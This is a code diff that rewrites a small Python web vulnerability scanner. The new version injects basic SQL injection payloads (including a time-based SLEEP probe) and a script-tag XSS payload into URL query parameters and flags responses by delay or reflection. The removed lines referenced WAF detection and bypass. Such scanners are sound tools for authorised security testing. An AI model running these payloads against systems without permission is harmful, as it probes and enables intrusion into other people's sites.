@@ -1,55 +1,56 @@
+import requests, time
 from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
-from ai import analyze
-from core.payloads import get_payloads
-from core.waf import detect_waf, bypass_payload
-from core.proxy import session
 
+PAYLOADS = {
+    "SQL Injection": ["' OR 1=1 --", "' OR SLEEP(5)--"],
+    "XSS": ["<script>alert(1)</script>"],
+}
 
 def inject(url, param, payload):
     p = urlparse(url)
     qs = parse_qs(p.query)
     qs[param] = payload
+    return urlunparse(p._replace(query=urlencode(qs, doseq=True)))
 
-    new_url = urlunparse(p._replace(query=urlencode(qs, doseq=True)))
-    return session.get(new_url, timeout=5).text
-
-
-def scan(url):
-    vulns = []
+def scan_target(url):
+    results = []
 
     try:
-        base = session.get(url, timeout=5).text
+        requests.get(url, timeout=5)
     except:
-        return vulns
+        return results
 
-    waf = detect_waf(base)
-    if waf:
-        print(f"[!] WAF Detected: {waf}")
+    parsed = urlparse(url)
+    if not parsed.query:
+        return results
 
-    if "?" not in url:
-        return vulns
-
-    for param in parse_qs(urlparse(url).query):
-
-        for vuln_type in ["sqli", "xss", "lfi", "ssrf"]:
-            payloads = get_payloads(vuln_type)
-
-            for payload in payloads:
-                if waf:
-                    payload = bypass_payload(payload)
-
-                print(f"[TEST] {param} → {payload}")
-
+    for param in parse_qs(parsed.query):
+        for t in PAYLOADS:
+            for payload in PAYLOADS[t]:
                 try:
-                    res = inject(url, param, payload)
+                    test = inject(url, param, payload)
+
+                    start = time.time()
+                    r = requests.get(test, timeout=5)
+                    delay = time.time() - start
+
+                    if "sql" in r.text.lower() or delay > 5:
+                        results.append({
+                            "type":"SQL Injection",
+                            "severity":"CRITICAL",
+                            "param":param,
+                            "payload":payload
+                        })
+
+                    if payload in r.text:
+                        results.append({
+                            "type":"XSS",
+                            "severity":"HIGH",
+                            "param":param,
+                            "payload":payload
+                        })
+
                 except:
                     continue
 
-                ai = analyze(base, res, param, payload, vuln_type)
-
-                if ai:
-                    print(f"[VULN] {param} → {ai['reason']}")
-                    vulns.append(ai)
-                    break
-
-    return vulns
+    return results
